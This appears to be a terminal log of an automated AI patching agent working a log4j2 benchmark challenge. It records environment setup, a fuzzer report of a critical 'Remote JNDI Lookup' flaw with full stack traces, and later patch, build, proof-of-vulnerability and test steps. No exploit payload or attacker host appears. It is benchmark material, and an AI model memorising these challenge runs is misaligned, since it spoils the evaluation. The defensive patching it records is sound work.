[2;36m[01/10/26 06:35:35][0m[2;36m [0m[34mINFO    [0m Building environment                                                                 ]8;id=643137;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=683891;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py#132\[2m132[0m]8;;\
[2;36m                    [0m         - Cache directory: [35m/tmp/[0m[95mtmpzpi71n2l[0m                                                  [2m               [0m
[2;36m                    [0m         - Max timeout: [1;36m1800[0m                                                                  [2m               [0m
[2;36m                    [0m         - Output directory:                                                                  [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/reports/prism.prism_claude_sonnet_4_5/log4j2_log4j2-delta-01_vuln_0[0m [2m               [0m
[2;36m                    [0m         [35m/[0m[95magent-output-1768026935.765852[0m                                                      [2m               [0m
[2;36m                    [0m         - Detection toml file:                                                               [2m               [0m
[2;36m                    [0m         scripts/benchmark/afc-delta-full/log4j2_log4j2-delta-01_vuln_0.toml                  [2m               [0m
[2;36m                    [0m         - Challenge project directory: [35m/home/qqor/crete/.cache/[0m[95mofficial-afc-logging-log4j2[0m   [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Building Cached for CLEAN environment[1m)[0m Started[33m...[0m ]8;id=545680;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=501858;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:36:39][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Building Cached for CLEAN environment[1m)[0m Took      ]8;id=17518;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=987663;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [1;36m63.88[0m seconds; [33mexception[0m=[3;91mFalse[0m                                                [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running tests for Cached for CLEAN environment[1m)[0m   ]8;id=110899;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=286214;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                    [0m         Started[33m...[0m                                                                     [2m                     [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running tests for Cached for CLEAN environment[1m)[0m  ]8;id=418172;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=144257;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         Took [1;36m0.00[0m seconds; [33mexception[0m=[3;91mFalse[0m                                            [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Setting timeouts                                                                       ]8;id=218616;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py\[2mdefault.py[0m]8;;\[2m:[0m]8;id=12087;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py#85\[2m85[0m]8;;\
[2;36m                    [0m           - build: [1;36m600[0m [1m([0moriginal: [1;36m63[0m[1m)[0m                                                          [2m             [0m
[2;36m                    [0m           - run tests: [1;36m600[0m [1m([0moriginal: [1;36m0[0m[1m)[0m                                                       [2m             [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=645368;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=926722;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:36:40][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m1.00[0m seconds;                ]8;id=795715;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=884513;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/10/26 06:36:41][0m[2;36m [0m[34mINFO    [0m Successfully created Cached for CLEAN environment                                    ]8;id=617829;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py\[2moss_fuzz.py[0m]8;;\[2m:[0m]8;id=633069;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py#256\[2m256[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Current environments: [1m[[0m[32m'CLEAN -> Cached'[0m[1m][0m                                            ]8;id=459999;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py\[2moss_fuzz.py[0m]8;;\[2m:[0m]8;id=551596;file:///home/qqor/crete/packages/crete/framework/environment_pool/services/oss_fuzz.py#265\[2m265[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.START -> TeamStatus.EVALUATE                    ]8;id=198005;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=163427;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m0[0m, patch status: PatchStatus.INITIALIZED[1m)[0m                                  [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=347221;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=905000;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:36:42][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.98[0m seconds;                ]8;id=84785;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=455449;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=728712;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=771834;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:36:43][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.92[0m seconds;                ]8;id=733114;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=488880;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/10/26 06:36:49][0m[2;36m [0m[34mINFO    [0m ===Evaluator [33mResult[0m===                                                              ]8;id=921904;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py\[2mevaluator.py[0m]8;;\[2m:[0m]8;id=214372;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py#204\[2m204[0m]8;;\
[2;36m                    [0m         PatchStatus.VULNERABLE                                                              [2m                [0m
[2;36m                    [0m         ===Evaluator [33mDiff[0m===                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Patch [33mResult[0m===                                                                  [2m                [0m
[2;36m                    [0m         == Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical:    [2m                [0m
[2;36m                    [0m         Remote JNDI Lookup                                                                  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can, depending on the JDK         [2m                [0m
[2;36m                    [0m         version, lead to remote code execution or the exfiltration of information.          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1m([0mNamingContex [2m                [0m
[2;36m                    [0m         tLookup.kt:[1;36m61[0m[1m)[0m                                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1m([0mJndiLookup.jav[1;92ma:60[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1m([0mInterpolator.jav[1;92ma:112[0m[1m)[0m     [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1m([0mStrSubstitutor. [2m                [0m
[2;36m                    [0m         jav[1;92ma:904[0m[1m)[0m                                                                           [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1m([0mStrSubstitutor.jav[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1m)[0m                                                                                   [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1m([0mMessagePattern [2m                [0m
[2;36m                    [0m         Converter.jav[1;92ma:72[0m[1m)[0m                                                                  [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1m([0mPatternFormatter.jav[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1m)[0m                                                                               [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1m([0mAbstractStrin [2m                [0m
[2;36m                    [0m         gLayout.jav[1;92ma:45[0m[1m)[0m                                                                    [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1m([0mAbstract [2m                [0m
[2;36m                    [0m         OutputStreamAppender.jav[1;92ma:113[0m[1m)[0m                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1m([0mAppenderControl.j [2m                [0m
[2;36m                    [0m         av[1;92ma:102[0m[1m)[0m                                                                            [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1m([0mLoggerConfig.jav[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1m)[0m                                                                                 [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:407[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:368[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at [1;35morg.apache.logging.log4j.core.Logger.log[0m[1m([0mLogger.jav[1;92ma:110[0m[1m)[0m                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1m([0mAbstractLogger.jav[1;92ma:1916[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1m([0mSimpleLoggerFuzzer.jav[1;92ma:42[0m[1m)[0m       [2m                [0m
[2;36m                    [0m         DEDUP_TOKEN: 03a39a742f79fa3d                                                       [2m                [0m
[2;36m                    [0m         == libFuzzer crashing input ==                                                      [2m                [0m
[2;36m                    [0m         ===[33mIssue[0m===                                                                         [2m                [0m
[2;36m                    [0m         == Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical:    [2m                [0m
[2;36m                    [0m         Remote JNDI Lookup                                                                  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can, depending on the JDK         [2m                [0m
[2;36m                    [0m         version, lead to remote code execution or the exfiltration of information.          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1m([0mNamingContex [2m                [0m
[2;36m                    [0m         tLookup.kt:[1;36m61[0m[1m)[0m                                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1m([0mJndiLookup.jav[1;92ma:60[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1m([0mInterpolator.jav[1;92ma:112[0m[1m)[0m     [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1m([0mStrSubstitutor. [2m                [0m
[2;36m                    [0m         jav[1;92ma:904[0m[1m)[0m                                                                           [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1m([0mStrSubstitutor.jav[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1m)[0m                                                                                   [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1m([0mMessagePattern [2m                [0m
[2;36m                    [0m         Converter.jav[1;92ma:72[0m[1m)[0m                                                                  [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1m([0mPatternFormatter.jav[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1m)[0m                                                                               [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1m([0mAbstractStrin [2m                [0m
[2;36m                    [0m         gLayout.jav[1;92ma:45[0m[1m)[0m                                                                    [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1m([0mAbstract [2m                [0m
[2;36m                    [0m         OutputStreamAppender.jav[1;92ma:113[0m[1m)[0m                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1m([0mAppenderControl.j [2m                [0m
[2;36m                    [0m         av[1;92ma:102[0m[1m)[0m                                                                            [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1m([0mLoggerConfig.jav[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1m)[0m                                                                                 [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:407[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:368[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at [1;35morg.apache.logging.log4j.core.Logger.log[0m[1m([0mLogger.jav[1;92ma:110[0m[1m)[0m                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1m([0mAbstractLogger.jav[1;92ma:1916[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1m([0mSimpleLoggerFuzzer.jav[1;92ma:42[0m[1m)[0m       [2m                [0m
[2;36m                    [0m         DEDUP_TOKEN: 03a39a742f79fa3d                                                       [2m                [0m
[2;36m                    [0m         == libFuzzer crashing input ==                                                      [2m                [0m
[2;36m                    [0m         ===Evaluation [33mReport[0m===                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Analysis [33mReport[0m===                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Evaluation [33mEnd[0m===                                                                [2m                [0m
[2;36m[01/10/26 06:37:09][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.EVALUATE -> TeamStatus.ANALYZE                  ]8;id=240021;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=83177;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m1[0m, patch status: PatchStatus.VULNERABLE[1m)[0m                                   [2m               [0m
[2;36m[01/10/26 06:42:21][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.ANALYZE -> TeamStatus.[1;33mPATCH[0m                     ]8;id=971152;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=627940;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m1[0m, patch status: PatchStatus.VULNERABLE[1m)[0m                                   [2m               [0m
[2;36m[01/10/26 06:43:00][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.[1;33mPATCH[0m -> TeamStatus.EVALUATE                    ]8;id=157951;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=397227;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m1[0m, patch status: PatchStatus.VULNERABLE[1m)[0m                                   [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=346565;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=139686;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:43:01][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.95[0m seconds;                ]8;id=607323;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=48215;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/10/26 06:43:02][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Patching[1m)[0m Started[33m...[0m                              ]8;id=201009;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=965534;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Checking valid diff: [35m/tmp/[0m[95mtmp5jwc3vj7[0m                                                 ]8;id=299135;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py\[2mdefault.py[0m]8;;\[2m:[0m]8;id=146348;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py#173\[2m173[0m]8;;\
[2;36m[01/10/26 06:43:39][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Patching[1m)[0m Took [1;36m37.14[0m seconds; [33mexception[0m=[3;91mFalse[0m    ]8;id=983633;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=474784;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Checking build[1m)[0m Started[33m...[0m                        ]8;id=118487;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=624600;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:43:48][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Checking build[1m)[0m Took [1;36m8.83[0m seconds;               ]8;id=808665;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=516415;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running PoV[1m)[0m Started[33m...[0m                           ]8;id=439659;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=909868;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:43:53][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running PoV[1m)[0m Took [1;36m5.79[0m seconds; [33mexception[0m=[3;91mFalse[0m  ]8;id=49733;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=999955;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Testing[1m)[0m Started[33m...[0m                               ]8;id=591927;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=621333;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Testing[1m)[0m Took [1;36m0.00[0m seconds; [33mexception[0m=[3;91mFalse[0m      ]8;id=246760;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=298253;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=288124;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=735629;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:43:54][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.96[0m seconds;                ]8;id=867165;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=795022;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/10/26 06:43:55][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=974668;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=314527;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:43:56][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.99[0m seconds;                ]8;id=58485;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=12242;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=405042;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=379496;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/10/26 06:43:57][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.90[0m seconds;                ]8;id=698116;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=168359;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
